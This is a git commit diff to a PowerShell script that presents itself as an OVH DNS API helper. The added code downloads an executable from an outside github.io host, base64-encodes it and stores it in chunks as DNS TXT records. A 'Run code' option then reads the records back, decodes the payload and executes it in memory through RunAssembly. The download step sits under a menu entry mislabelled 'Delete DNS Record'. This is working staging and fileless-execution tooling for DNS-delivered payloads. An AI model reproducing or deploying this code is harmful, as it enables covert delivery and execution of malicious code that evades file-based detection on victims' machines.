0166d6eefe703a1bb077e7ff6729977dd631fb63
Olivier LEUNG <olivierleung@hotmail.fr>
2023-03-20 06:24:10 +0100

    Add files via upload

--- OVHapi.ps1
+++ OVHapi.ps1
@@ -13,6 +13,7 @@ $global:AK = ""
 $global:AS = ""
 $global:CK = ""
 $global:TIME = [DateTimeOffset]::Now.ToUnixTimeSeconds()
+$global:DOMAIN = ""
 # ----------------------------------------------------------------------------
 
 function RunAssembly{
@@ -46,9 +47,16 @@ function GetOVHSignatureFromQuery{
     return($Signature)
 }
 
+
+# -------------- Initialize Variable ---------------#
+$RecordID = @()  # Clear Array
+$subDomainNumber = 0 # Clear variable
+# --------------------------------------------------#
+
 Write-Output("1. Test Connection")
 Write-Output("2. Write DNS Record")
 Write-Output("3. Delete DNS Record")
+Write-Output("4. Run code")
 
 $Choice = Read-Host("What action do you want to proceed ?")
 
@@ -61,7 +69,6 @@ Switch($Choice){
         $BODY = ""
         $SIGNATURE = GetOVHSignatureFromQuery -Method $METHOD -Query $QUERY -Body $BODY
         Invoke-WebRequest -Method $METHOD -Headers @{"Content-type"="application/json"; "X-Ovh-Application"=$AK; "X-Ovh-Consumer"=$CK; "X-Ovh-Signature"=$SIGNATURE; "X-Ovh-Timestamp"=$TIME} -Uri $QUERY
-    
     }
 
     2{ # Write DNS Record
@@ -80,42 +87,52 @@ Switch($Choice){
         $METHOD = "GET"
         $BODY=""
         $SIGNATURE = GetOVHSignatureFromQuery -Method $METHOD -Query $QUERY -Body $BODY
-        $DOMAIN = Invoke-WebRequest -Method $METHOD -Headers @{"Content-type"="application/json"; "X-Ovh-Application"=$AK; "X-Ovh-Consumer"=$CK; "X-Ovh-Signature"=$SIGNATURE; "X-Ovh-Timestamp"=$TIME} -Uri $QUERY | ConvertFrom-Json
         Write-Output("DOMAIN : {0}" -f $DOMAIN)
 
         # Write DNS records
         $QUERY = "https://api.ovh.com/1.0/domain/zone/{0}/record" -f $DOMAIN
         $METHOD = "POST"
-        $i = 0
-
-        $subString = $base64.Substring($i*254,254)
-        $BODY = @{"fieldType"="TXT"; "subDomain"=$i; "target"=$subString} | ConvertTo-Json
-        $SIGNATURE = GetOVHSignatureFromQuery -Method $METHOD -Query $QUERY -Body $BODY
-        Invoke-WebRequest -Method $METHOD -Headers @{"Content-type"="application/json"; "X-Ovh-Application"=$AK; "X-Ovh-Consumer"=$CK; "X-Ovh-Signature"=$SIGNATURE; "X-Ovh-Timestamp"=$TIME} -Body $BODY -Uri $QUERY
-
-
-
-        #For ($i = 0; $i -lt $subDomainNumber; $i++){
-         #   $subString = $base64.Substring($i*254,254)
-         #   $BODY = @{"fieldType"="TXT"; "subDomain"=str($i); "target"=$subString}
-         #   $SIGNATURE = GetOVHSignatureFromQuery -ApplicationSecret $AS -ConsumerKey $CK -Method $METHOD -Query $QUERY -Body $BODY -Time $TIME
-         #   Invoke-WebRequest -Method $METHOD -Headers @{"Content-type"="application/json"; "X-Ovh-Application"=$AK; "X-Ovh-Consumer"=$CK; "X-Ovh-Signature"=$SIGNATURE; "X-Ovh-Timestamp"=$TIME} -Body $BODY $QUERY
-        #}
+        
+        For ($i = 0; $i -lt $subDomainNumber; $i++){
+            try{
+                $subString = $base64.Substring($i*254,254)
+                $BODY = @{"fieldType"="TXT"; "subDomain"=$i; "target"=$subString} | ConvertTo-Json
+                $SIGNATURE = GetOVHSignatureFromQuery -Method $METHOD -Query $QUERY -Body $BODY
+                Invoke-WebRequest -Method $METHOD -Headers @{"Content-type"="application/json"; "X-Ovh-Application"=$AK; "X-Ovh-Consumer"=$CK; "X-Ovh-Signature"=$SIGNATURE; "X-Ovh-Timestamp"=$TIME} -Body $BODY -Uri $QUERY
+            }
+            catch [ArgumentOutOfRangeException]{
+                $subString = $base64.Substring($i*254,$base64.Length - ($i*254))
+                $BODY = @{"fieldType"="TXT"; "subDomain"=$i; "target"=$subString} | ConvertTo-Json
+                $SIGNATURE = GetOVHSignatureFromQuery -Method $METHOD -Query $QUERY -Body $BODY
+                Invoke-WebRequest -Method $METHOD -Headers @{"Content-type"="application/json"; "X-Ovh-Application"=$AK; "X-Ovh-Consumer"=$CK; "X-Ovh-Signature"=$SIGNATURE; "X-Ovh-Timestamp"=$TIME} -Body $BODY -Uri $QUERY
+            }
+        }
     }
 
     3{ # Delete DNS Record
+        
+        $url = "https://hakkyahud.github.io/HelloWorldCS.exe"
+        $bytes = (New-Object Net.WebClient).DownloadData($url)
 
+        # Convert to base64
+        $base64 = [System.Convert]::ToBase64String($bytes)
+
+        # Subdomain calculation
+        $subDomainNumber = [math]::Ceiling($base64.Length/254)
         # First get the ID of record to be deleted
-        $i = "test"
-        $QUERY = "https://api.ovh.com/1.0/domain/zone/{0}/record?fieldType=TXT&subDomain={1}" -f $DOMAIN, $i
-        $METHOD = "GET"
-        $BODY = ""
-        $SIGNATURE = GetOVHSignatureFromQuery -Method $METHOD -Query $QUERY -Body $BODY -Time $TIME
-        $RecordID = Invoke-WebRequest -Method $METHOD -Headers @{"Content-type"="application/json"; "X-Ovh-Application"=$AK; "X-Ovh-Consumer"=$CK; "X-Ovh-Signature"=$SIGNATURE; "X-Ovh-Timestamp"=$TIME} -Uri $QUERY | ConvertFrom-Json
+        For ($i = 0; $i -lt $subDomainNumber; $i++){
+            $QUERY = "https://api.ovh.com/1.0/domain/zone/{0}/record?fieldType=TXT&subDomain={1}" -f $DOMAIN, $i
+            $METHOD = "GET"
+            $BODY = ""
+            $SIGNATURE = GetOVHSignatureFromQuery -Method $METHOD -Query $QUERY -Body $BODY -Time $TIME
+            $RecordID += Invoke-WebRequest -Method $METHOD -Headers @{"Content-type"="application/json"; "X-Ovh-Application"=$AK; "X-Ovh-Consumer"=$CK; "X-Ovh-Signature"=$SIGNATURE; "X-Ovh-Timestamp"=$TIME} -Uri $QUERY | ConvertFrom-Json
+        }
 
+        Write-Output($RecordID.Length)
+               
         # Delete DNS record from the retrieved IDs
         For ($i = 0; $i -lt $RecordID.Length; $i++){
-            Write-Output($RecordID[$i])
+            Write-Output("ID to delete : {0}" -f $RecordID[$i])
             $METHOD = "DELETE"
             $QUERY = "https://api.ovh.com/1.0/domain/zone/{0}/record/{1}" -f $DOMAIN, $RecordID[$i]
             $SIGNATURE = GetOVHSignatureFromQuery -ApplicationSecret $AS -ConsumerKey $CK -Method $METHOD -Query $QUERY -Body $BODY -Time $TIME
@@ -124,20 +141,32 @@ Switch($Choice){
 
     }
 
+    4{ # Run code
+        $PAYLOAD = ""
+        # Get record ID
+        For ($i=0; $i -lt 19; $i++){
+            $METHOD = "GET"
+            $BODY = ""
+            $QUERY = "https://api.ovh.com/1.0/domain/zone/{0}/record?fieldType=TXT&subDomain={1}" -f $DOMAIN, $i
+            $SIGNATURE = GetOVHSignatureFromQuery -Method $METHOD -Query $QUERY -Body $BODY -Time $TIME
+            $RecordID += Invoke-WebRequest -Method $METHOD -Headers @{"Content-type"="application/json"; "X-Ovh-Application"=$AK; "X-Ovh-Consumer"=$CK; "X-Ovh-Signature"=$SIGNATURE; "X-Ovh-Timestamp"=$TIME} -Uri $QUERY | ConvertFrom-Json
+        }
+
+        Write-Output("Length : {0}" -f $RecordID.Length)
+
+        # Get info of the ID
+        For ($i=0; $i -lt $RecordID.Length; $i++){
+            $QUERY = "https://api.ovh.com/1.0/domain/zone/{0}/record/{1}" -f $DOMAIN, $RecordID[$i]
+            $SIGNATURE = GetOVHSignatureFromQuery -Method $METHOD -Query $QUERY -Body $BODY -Time $TIME
+            $request = Invoke-WebRequest -Method $METHOD -Headers @{"Content-type"="application/json"; "X-Ovh-Application"=$AK; "X-Ovh-Consumer"=$CK; "X-Ovh-Signature"=$SIGNATURE; "X-Ovh-Timestamp"=$TIME} -Uri $QUERY | ConvertFrom-Json
+            $PAYLOADB64 = $PAYLOADB64 + $request.target
+        }
+        
+        Write-Host($PAYLOADB64)
+        $bytes = [System.Convert]::FromBase64String($PAYLOADB64)
+        RunAssembly($bytes)
+    }
+
     Default {Write-Output("Wrong choice, bye.")}
 
 }
-
-
-
-
-
-# $bytes2 = [System.Convert]::FromBase64String($base64)
-# RunAssembly($bytes2)
-
-
-
-
-
-
-
